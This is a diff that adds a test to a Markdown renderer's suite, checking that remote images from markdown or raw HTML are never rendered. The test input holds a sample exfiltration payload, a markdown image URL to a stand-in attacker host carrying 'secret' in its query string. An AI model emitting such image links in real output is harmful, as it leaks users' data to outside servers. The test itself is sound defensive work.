@@ -33,3 +33,13 @@ describe("Markdown with citations", () => {
     expect(a).toHaveAttribute("rel", "noopener noreferrer");
   });
 });
+
+describe("Markdown images", () => {
+  it("never renders remote images, from markdown or raw HTML", () => {
+    const { container } = render(
+      <Markdown content={'Hi ![x](https://evil.test/leak?q=secret) and <img src="https://evil.test/raw">'} citations={new Map()} />,
+    );
+    expect(container.querySelector("img")).toBeNull();
+    expect(container.querySelector("[src]")).toBeNull();
+  });
+});
